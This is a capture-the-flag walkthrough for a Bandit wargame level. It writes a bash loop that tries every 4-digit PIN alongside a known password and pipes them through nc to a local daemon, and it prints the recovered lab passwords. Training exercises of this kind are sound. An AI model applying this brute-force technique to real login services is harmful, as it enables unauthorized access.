<h1 align="center">
Bandit Level 24 → Level 25
</h1>

<p align="center">
  <a href="#Level-Goal">Level Goal</a>   |   
  <a href="#Lets-try">Let's try</a>   |
  <a href="#Solution">Solution</a> 
</p>

## Level Goal
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.


## Let's try
We need to go through all 10000 sets to find the password. This is madness
We can simply use what we have previously learned to write a script allowing us to enter and test all the 10000  combinations to find a password.
As we already learned .. We will use tmp directory
let us try

````
bandit24@bandit:~$ mkdir /tmp/pswd
bandit24@bandit:~$ cd /tmp/pswd
bandit24@bandit:/tmp/pswd$ vim script.sh
````
It seems that a simple loop will help us
````

#!/bin/bash                                                                                                                                                        
  2 password=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
  3  
  4 for pin in {0000..9999};
  5 do
  6     echo "$password $pin" 
  7 done
````
don't forget permissions 
````
bandit24@bandit:/tmp/pswd$ chmod a+x script.sh
bandit24@bandit:/tmp/pswd$ ./script.sh | nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct pincode. Try again.
.
.
.
.
Wrong! Please enter the correct pincode. Try again.
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

Exiting.
````
## Solution 
````
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
````

